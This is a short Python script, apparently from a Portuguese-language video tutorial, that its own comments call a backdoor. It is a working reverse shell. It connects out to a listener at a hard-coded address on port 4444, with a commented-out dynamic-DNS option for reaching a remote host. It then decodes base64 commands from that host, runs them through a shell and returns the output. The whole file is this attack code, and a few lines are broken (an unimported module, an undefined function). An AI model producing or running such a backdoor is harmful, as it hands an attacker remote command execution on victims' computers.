import socket
import subprocess
import os
import base64

# Vou deixar exemplo de noip pro 6

# ddns = 'ddns.ddns.net'
# IP = socket.gethostbyname(ddns)

# Vou usar ip local, que se descobre no cmd
# Meu ip local e 192.168.15.10

IP = '192.168.15.10'
PORTA = 4444

# Criarei a conexao

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORTA))
s.send('Conectado')

# Decodificar comandos
def base64_deco(strings):
	return base64.b64decode(strings)


def Principal():
	while True:
		receber = base64_deco(s.recv(1024))
		if receber [:-1] == '/exit':
			sys.close()
			s.close()
			close()



			# Aqui foi tratamento de erro, backdoor ta fraco ainda, vamos melhorar nos videos extras, entao acompanhem o canal
		sub = subprocess.Popen(receber, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		saida = sub.stderr.read()+sub.stdout.read()
		s.send(saida)



def Cliente():
	Principal()

Cliente()
